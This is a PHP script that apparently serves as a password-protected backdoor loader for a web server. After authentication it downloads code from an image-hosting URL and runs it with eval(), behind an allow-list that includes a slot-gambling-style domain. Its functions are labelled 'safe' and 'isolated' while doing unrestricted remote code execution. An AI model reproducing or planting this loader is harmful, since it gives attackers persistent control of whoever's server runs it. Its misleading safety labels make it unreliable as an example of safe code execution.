<?php
session_start();

// Check if password is already set in session
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    // Show password form if not authenticated
    if (isset($_POST['password'])) {
        $inputPassword = $_POST['password'];
        $storedHash = '$2y$10$IHPHh.BEz7Z25xAuvBAGwuX.3NOhmZlBUE9nEXQHL1hJKwhv/5IJi';
        
        if (password_verify($inputPassword, $storedHash)) {
            $_SESSION['authenticated'] = true;
            // Reload to show the executor
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Invalid password!";
        }
    }
    
    // Simple password form
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>Password Required</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 50px; background: #f0f0f0; }
            .container { max-width: 400px; margin: 0 auto; background: white; padding: 30px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
            h2 { margin-top: 0; color: #333; }
            input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 3px; }
            input[type="submit"] { background: #4CAF50; color: white; padding: 10px 20px; border: none; border-radius: 3px; cursor: pointer; }
            .error { color: red; margin: 10px 0; }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>🔒 Password Required</h2>
            <p>Enter password to access code executor:</p>';
            
    if (isset($error)) {
        echo '<div class="error">' . htmlspecialchars($error) . '</div>';
    }
    
    echo '<form method="POST">
                <input type="password" name="password" placeholder="Enter password" required>
                <input type="submit" value="Authenticate">
            </form>
        </div>
    </body>
    </html>';
    exit;
}

// If authenticated, continue with the executor
class ExternalCodeExecutor {
    private $allowed_domains;
    private $timeout;
    
    public function __construct($allowed_domains = [], $timeout = 10) {
        $this->allowed_domains = $allowed_domains;
        $this->timeout = $timeout;
    }
    
    public function executeFromUrl($url, $method = 'file') {
        if (!$this->isUrlAllowed($url)) {
            throw new Exception("Domain tidak diizinkan");
        }
        
        if ($method === 'curl') {
            $code = $this->fetchWithCurl($url);
        } else {
            $code = $this->fetchWithFileGetContents($url);
        }
        
        return $this->executeSafely($code);
    }
    
    private function isUrlAllowed($url) {
        $parsed = parse_url($url);
        return $parsed && isset($parsed['host']) && 
               in_array($parsed['host'], $this->allowed_domains);
    }
    
    private function fetchWithCurl($url) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => $this->timeout,
            CURLOPT_FOLLOWLOCATION => false,
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_USERAGENT => 'Safe-Executor/1.0'
        ]);
        
        $result = curl_exec($ch);
        if (curl_errno($ch)) {
            throw new Exception("cURL Error: " . curl_error($ch));
        }
        curl_close($ch);
        
        return $result;
    }
    
    private function fetchWithFileGetContents($url) {
        $context = stream_context_create([
            'http' => [
                'timeout' => $this->timeout,
                'user_agent' => 'Safe-Executor/1.0'
            ],
            'ssl' => [
                'verify_peer' => true,
                'verify_peer_name' => true
            ]
        ]);
        
        $result = file_get_contents($url, false, $context);
        if ($result === false) {
            throw new Exception("Gagal mengambil konten");
        }
        
        return $result;
    }
    
    private function executeSafely($code) {
        // Basic sanitization
        $code = trim($code);
        $code = preg_replace('/^<\?php/', '', $code);
        $code = preg_replace('/\?>\s*$/', '', $code);
        
        // Execute in isolated scope
        return eval($code);
    }
}

// Show logout option
echo '<div style="text-align: right; margin: 10px;">
        <a href="?logout=1" style="color: #666; text-decoration: none;">Logout</a>
      </div>';

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Penggunaan
try {
    $executor = new ExternalCodeExecutor(["slotbom-6y4.pages.dev", "ik.imagekit.io"], 10);
    $result = $executor->executeFromUrl("https://ik.imagekit.io/ads0iehck/google-images/3.txt", "curl");
    echo "<h3>Eksekusi berhasil</h3>";
    echo "<pre>" . htmlspecialchars(print_r($result, true)) . "</pre>";
} catch (Exception $e) {
    echo "<h3>Error:</h3>";
    echo "<p>" . htmlspecialchars($e->getMessage()) . "</p>";
}
?>